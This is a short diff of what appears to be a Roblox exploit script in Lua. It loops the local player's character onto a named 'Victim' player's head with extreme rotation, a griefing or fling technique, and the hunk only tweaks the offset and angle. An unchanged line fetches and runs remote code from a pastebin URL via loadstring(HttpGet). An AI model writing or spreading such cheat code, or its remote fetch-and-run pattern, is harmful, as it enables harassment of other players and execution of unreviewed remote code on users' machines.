@@ -70,7 +70,7 @@ Credits.Button({
         local P=game:GetService'Players'.LocalPlayer
 local C=P.Character or P.CharacterAdded:Wait()
 game:GetService'RunService'.Heartbeat:Connect(function()
-    C:WaitForChild'HumanoidRootPart'.CFrame=CFrame.new(game:GetService'Players':FindFirstChild(Victim).Character:WaitForChild'Head'.Position) * CFrame.new(0,-2,0) * CFrame.Angles(9e9,0,0) --loop this
+    C:WaitForChild'HumanoidRootPart'.CFrame=CFrame.new(game:GetService'Players':FindFirstChild(Victim).Character:WaitForChild'Head'.Position) * CFrame.new(0,-0.5,0) * CFrame.Angles(250,0,0) --loop this
     wait(5)
     loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
 
